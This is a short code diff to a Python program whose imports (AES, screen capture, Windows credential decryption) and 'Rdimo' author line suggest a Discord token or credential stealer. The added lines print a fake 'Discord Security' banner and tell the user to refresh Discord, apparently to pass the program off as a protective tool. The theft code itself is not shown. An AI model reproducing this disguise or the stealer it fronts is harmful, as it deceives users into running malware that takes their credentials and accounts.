@@ -22,6 +22,13 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
+version = 1
+
+print("Discord Security")
+print("[+] Discord Security is up and running!")
+print("[+] Refresh your discord by pressing CTRL + R on your keyboard while in Discord app.")
+print(f"[+] Discord Security Version: {version}")
+
 __author__ = "Rdimo"
 __version__ = '1.8.8'
 __license__ = "GPL-3.0"
